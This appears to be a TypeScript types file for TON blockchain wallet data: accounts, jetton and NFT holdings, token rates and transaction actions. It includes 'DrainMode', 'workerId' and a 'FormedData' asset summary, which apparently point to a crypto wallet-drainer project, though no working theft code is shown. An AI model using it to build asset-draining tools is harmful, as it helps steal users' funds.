import type { DrainMode } from '@prisma/client'

export declare enum AccountStatus {
	Nonexist = 'nonexist',
	Uninit = 'uninit',
	Active = 'active',
	Frozen = 'frozen',
}

export declare enum TrustType {
	Whitelist = 'whitelist',
	Graylist = 'graylist',
	Blacklist = 'blacklist',
	None = 'none',
}

export interface Price {
	/** @example "123000000000" */
	value: string
	/** @example "TON" */
	token_name: string
}

export type NftApprovedBy = ('getgems' | 'tonkeeper' | 'ton.diamonds')[]

export interface JettonPreview {
	/**
	 * @format address
	 * @example "0:0BB5A9F69043EEBDDA5AD2E946EB953242BD8F603FE795D90698CEEC6BFC60A0"
	 */
	address: string
	/** @example "Wrapped TON" */
	name: string
	/** @example "WTON" */
	symbol: string
	/** @example 9 */
	decimals: number
	/** @example "https://cache.tonapi.io/images/jetton.jpg" */
	image: string
	verification: JettonVerificationType
}

export interface ImagePreview {
	/** @example "100x100" */
	resolution: string
	/** @example "https://site.com/pic1.jpg" */
	url: string
}

export interface TokenRates {
	/** @example {"TON":1.3710752873163712} */
	prices?: Record<string, number>
	/** @example {"TON":"-1.28%"} */
	diff_24h?: Record<string, string>
	/** @example {"TON":"-2.74%"} */
	diff_7d?: Record<string, string>
	/** @example {"TON":"-0.56%"} */
	diff_30d?: Record<string, string>
}

export interface Sale {
	/**
	 * @format address
	 * @example "0:10C1073837B93FDAAD594284CE8B8EFF7B9CF25427440EB2FC682762E1471365"
	 */
	address: string
	market: AccountAddress
	owner?: AccountAddress
	price: Price
}

export interface AccountAddress {
	/**
	 * @format address
	 * @example "0:10C1073837B93FDAAD594284CE8B8EFF7B9CF25427440EB2FC682762E1471365"
	 */
	address: string
	/**
	 * Display name. Data collected from different sources like moderation lists, dns, collections names and over.
	 * @example "Ton foundation"
	 */
	name?: string
	/**
	 * Is this account was marked as part of scammers activity
	 * @example true
	 */
	is_scam: boolean
	/** @example "https://ton.org/logo.png" */
	icon?: string
	/** @example true */
	is_wallet: boolean
}

export interface Account {
	/**
	 * @format address
	 * @example "0:da6b1b6663a0e4d18cc8574ccd9db5296e367dd9324706f3bbd9eb1cd2caf0bf"
	 */
	address: string
	/**
	 * @format int64
	 * @example 123456789
	 */
	balance: number
	/**
	 * {'USD': 1, 'IDR': 1000}
	 * @example {}
	 */
	currencies_balance?: Record<string, any>
	/**
	 * unix timestamp
	 * @format int64
	 * @example 1720860269
	 */
	last_activity: number
	status: AccountStatus
	interfaces?: string[]
	/** @example "Ton foundation" */
	name?: string
	/** @example true */
	is_scam?: boolean
	/** @example "https://ton.org/logo.png" */
	icon?: string
	/** @example true */
	memo_required?: boolean
	/** @example ["get_item_data"] */
	get_methods: string[]
	is_suspended?: boolean
	is_wallet: boolean
}

export interface NftItem {
	/**
	 * @format address
	 * @example "0:E93E7D444180608B8520C00DC664383A387356FB6E16FDDF99DBE5E1415A574B"
	 */
	address: string
	/**
	 * @format int64
	 * @example 58
	 */
	index: number
	owner?: AccountAddress
	collection?: {
		/**
		 * @format address
		 * @example "0:E93E7D444180608B8520C00DC664383A387356FB6E16FDDF99DBE5E1415A574B"
		 */
		address: string
		/** @example "TON Diamonds" */
		name: string
		/** @example "Best collection in TON network" */
		description: string
	}
	/** @example true */
	verified: boolean
	/** @example {} */
	metadata: Record<string, any>
	sale?: Sale
	previews?: ImagePreview[]
	/** @example "crypto.ton" */
	dns?: string
	approved_by: NftApprovedBy
	/** @example false */
	include_cnft?: boolean
	trust: TrustType
}
export interface NftItems {
	nft_items: NftItem[]
}

export interface JettonBalance {
	/** @example 597968399 */
	balance: string
	price?: TokenRates
	wallet_address: AccountAddress
	jetton: JettonPreview
	/** @example ["custom_payload","non_transferable"] */
	extensions?: string[]
	lock?: {
		/** @example 597968399 */
		amount: string
		/**
		 * @format int64
		 * @example 1678223064
		 */
		till: number
	}
}
export interface JettonsBalances {
	balances: JettonBalance[]
}

export interface RatesResponse {
	rates: {
		TON: {
			prices: {
				USD: number
			}
			diff_24h: {
				USD: string
			}
			diff_7d: {
				USD: string
			}
			diff_30d: {
				USD: string
			}
		}
	}
}

export type FormedData = {
	wallet: Account
	ton: number
	nfts: Array<{
		address: string
		name: string
		col_address: string
	}>
	jettons: Array<{
		address: string
		wallet: string
		amount: number
		rate: number
		dec: number
		name: string
	}>
}

export interface Options {
	drainMode: DrainMode
	workerId: number
	name?: string
	amount?: number
	[key: string]: any
}

export interface TonTransferAction {
	sender: AccountAddress
	recipient: AccountAddress
	/**
	 * amount in nanotons
	 * @format int64
	 * @example 123456789
	 */
	amount: number
	/**
	 * @example "Hi! This is your salary.
	 * From accounting with love."
	 */
	comment?: string
	encrypted_comment?: EncryptedComment
	refund?: Refund
}
export interface SmartContractAction {
	executor: AccountAddress
	contract: AccountAddress
	/**
	 * amount in nanotons
	 * @format int64
	 * @example 123456789
	 */
	ton_attached: number
	/** @example "NftTransfer or 0x35d95a12" */
	operation: string
	payload?: string
	refund?: Refund
}
export interface DomainRenewAction {
	/** @example "vasya.ton" */
	domain: string
	/**
	 * @format address
	 * @example "0:da6b1b6663a0e4d18cc8574ccd9db5296e367dd9324706f3bbd9eb1cd2caf0bf"
	 */
	contract_address: string
	renewer: AccountAddress
}
export interface InscriptionMintAction {
	recipient: AccountAddress
	/**
	 * amount in minimal particles
	 * @example "123456789"
	 */
	amount: string
	/** @example "ton20" */
	type: 'ton20' | 'gram20'
	/** @example "nano" */
	ticker: string
	/** @example 9 */
	decimals: number
}
export interface InscriptionTransferAction {
	sender: AccountAddress
	recipient: AccountAddress
	/**
	 * amount in minimal particles
	 * @example "123456789"
	 */
	amount: string
	/**
	 * @example "Hi! This is your salary.
	 * From accounting with love."
	 */
	comment?: string
	/** @example "ton20" */
	type: 'ton20' | 'gram20'
	/** @example "nano" */
	ticker: string
	/** @example 9 */
	decimals: number
}
export interface NftItemTransferAction {
	sender?: AccountAddress
	recipient?: AccountAddress
	/** @example "" */
	nft: string
	/**
	 * @example "Hi! This is your salary.
	 * From accounting with love."
	 */
	comment?: string
	encrypted_comment?: EncryptedComment
	/**
	 * raw hex encoded payload
	 * @example "0234de3e21d21b3ee21f3"
	 */
	payload?: string
	refund?: Refund
}
export interface JettonTransferAction {
	sender?: AccountAddress
	recipient?: AccountAddress
	/**
	 * @format address
	 * @example "0:E93E7D444180608B8520C00DC664383A387356FB6E16FDDF99DBE5E1415A574B"
	 */
	senders_wallet: string
	/**
	 * @format address
	 * @example "0:E93E7D444180608B8520C00DC664383A387356FB6E16FDDF99DBE5E1415A574B"
	 */
	recipients_wallet: string
	/**
	 * amount in quanta of tokens
	 * @example 1000000000
	 */
	amount: string
	/**
	 * @example "Hi! This is your salary.
	 * From accounting with love."
	 */
	comment?: string
	encrypted_comment?: EncryptedComment
	refund?: Refund
	jetton: JettonPreview
}
export interface JettonBurnAction {
	sender: AccountAddress
	/**
	 * @format address
	 * @example "0:E93E7D444180608B8520C00DC664383A387356FB6E16FDDF99DBE5E1415A574B"
	 */
	senders_wallet: string
	/**
	 * amount in quanta of tokens
	 * @example 1000000000
	 */
	amount: string
	jetton: JettonPreview
}
export interface JettonMintAction {
	recipient: AccountAddress
	/**
	 * @format address
	 * @example "0:E93E7D444180608B8520C00DC664383A387356FB6E16FDDF99DBE5E1415A574B"
	 */
	recipients_wallet: string
	/**
	 * amount in quanta of tokens
	 * @example 1000000000
	 */
	amount: string
	jetton: JettonPreview
}
export interface ContractDeployAction {
	/**
	 * @format address
	 * @example "0:da6b1b6663a0e4d18cc8574ccd9db5296e367dd9324706f3bbd9eb1cd2caf0bf"
	 */
	address: string
	/** @example ["nft_item","nft_royalty"] */
	interfaces: string[]
}
export interface SubscriptionAction {
	subscriber: AccountAddress
	/**
	 * @format address
	 * @example "0:da6b1b6663a0e4d18cc8574ccd9db5296e367dd9324706f3bbd9eb1cd2caf0bf"
	 */
	subscription: string
	beneficiary: AccountAddress
	/**
	 * @format int64
	 * @example 1000000000
	 */
	amount: number
	/** @example false */
	initial: boolean
}
export interface UnSubscriptionAction {
	subscriber: AccountAddress
	/**
	 * @format address
	 * @example "0:da6b1b6663a0e4d18cc8574ccd9db5296e367dd9324706f3bbd9eb1cd2caf0bf"
	 */
	subscription: string
	beneficiary: AccountAddress
}
export interface AuctionBidAction {
	auction_type: 'DNS.ton' | 'DNS.tg' | 'NUMBER.tg' | 'getgems'
	amount: Price
	nft?: NftItem
	bidder: AccountAddress
	auction: AccountAddress
}
/** validator's participation in elections */
export interface DepositStakeAction {
	/**
	 * @format int64
	 * @example 1660050553
	 */
	amount: number
	staker: AccountAddress
	pool: AccountAddress
	implementation: PoolImplementationType
}
/** validator's participation in elections */
export interface WithdrawStakeAction {
	/**
	 * @format int64
	 * @example 1660050553
	 */
	amount: number
	staker: AccountAddress
	pool: AccountAddress
	implementation: PoolImplementationType
}
/** validator's participation in elections */
export interface WithdrawStakeRequestAction {
	/**
	 * @format int64
	 * @example 1660050553
	 */
	amount?: number
	staker: AccountAddress
	pool: AccountAddress
	implementation: PoolImplementationType
}
export interface ElectionsRecoverStakeAction {
	/**
	 * @format int64
	 * @example 1660050553
	 */
	amount: number
	staker: AccountAddress
}
export interface ElectionsDepositStakeAction {
	/**
	 * @format int64
	 * @example 1660050553
	 */
	amount: number
	staker: AccountAddress
}
export interface JettonSwapAction {
	dex: 'stonfi' | 'dedust' | 'megatonfi'
	/** @example "1660050553" */
	amount_in: string
	/** @example "1660050553" */
	amount_out: string
	/**
	 * @format int64
	 * @example 1000000000
	 */
	ton_in?: number
	/**
	 * @format int64
	 * @example 2000000000
	 */
	ton_out?: number
	user_wallet: AccountAddress
	router: AccountAddress
	jetton_master_in?: JettonPreview
	jetton_master_out?: JettonPreview
}
export interface NftPurchaseAction {
	auction_type: 'DNS.ton' | 'DNS.tg' | 'NUMBER.tg' | 'getgems'
	amount: Price
	nft: NftItem
	seller: AccountAddress
	buyer: AccountAddress
}
/** shortly describes what this action is about. */
export interface ActionSimplePreview {
	/** @example "Ton Transfer" */
	name: string
	/** @example "Transferring 5 Ton" */
	description: string
	/** a link to an image for this particular action. */
	action_image?: string
	/** @example "5 Ton" */
	value?: string
	/** a link to an image that depicts this action's asset. */
	value_image?: string
	accounts: AccountAddress[]
}

export interface Action {
	/** @example "TonTransfer" */
	type:
		| 'TonTransfer'
		| 'JettonTransfer'
		| 'JettonBurn'
		| 'JettonMint'
		| 'NftItemTransfer'
		| 'ContractDeploy'
		| 'Subscribe'
		| 'UnSubscribe'
		| 'AuctionBid'
		| 'NftPurchase'
		| 'DepositStake'
		| 'WithdrawStake'
		| 'WithdrawStakeRequest'
		| 'JettonSwap'
		| 'SmartContractExec'
		| 'ElectionsRecoverStake'
		| 'ElectionsDepositStake'
		| 'DomainRenew'
		| 'InscriptionTransfer'
		| 'InscriptionMint'
		| 'Unknown'
	/** @example "ok" */
	status: 'ok' | 'failed'
	TonTransfer?: TonTransferAction
	ContractDeploy?: ContractDeployAction
	JettonTransfer?: JettonTransferAction
	JettonBurn?: JettonBurnAction
	JettonMint?: JettonMintAction
	NftItemTransfer?: NftItemTransferAction
	Subscribe?: SubscriptionAction
	UnSubscribe?: UnSubscriptionAction
	AuctionBid?: AuctionBidAction
	NftPurchase?: NftPurchaseAction
	/** validator's participation in elections */
	DepositStake?: DepositStakeAction
	/** validator's participation in elections */
	WithdrawStake?: WithdrawStakeAction
	/** validator's participation in elections */
	WithdrawStakeRequest?: WithdrawStakeRequestAction
	ElectionsDepositStake?: ElectionsDepositStakeAction
	ElectionsRecoverStake?: ElectionsRecoverStakeAction
	JettonSwap?: JettonSwapAction
	SmartContractExec?: SmartContractAction
	DomainRenew?: DomainRenewAction
	InscriptionTransfer?: InscriptionTransferAction
	InscriptionMint?: InscriptionMintAction
	/** shortly describes what this action is about. */
	simple_preview: ActionSimplePreview
	base_transactions: string[]
}

export interface Item {
	type: ItemTypes
	raw: any
	price: number
	name?: string
	shouldCancel?: boolean
}

export interface AccountEvent {
	/** @example "e8b0e3fee4a26bd2317ac1f9952fcdc87dc08fdb617656b5202416323337372e" */
	event_id: string
	account: AccountAddress
	/**
	 * @format int64
	 * @example 1234567890
	 */
	timestamp: number
	actions: Action[]
	/**
	 * scam
	 * @example false
	 */
	is_scam: boolean
	/**
	 * @format int64
	 * @example 25713146000001
	 */
	lt: number
	/**
	 * Event is not finished yet. Transactions still happening
	 * @example false
	 */
	in_progress: boolean
	/**
	 * TODO
	 * @format int64
	 * @example 3
	 */
	extra: number
}

export interface AccountEvents {
	events: AccountEvent[]
	/**
	 * @format int64
	 * @example 25713146000001
	 */
	next_from: number
}
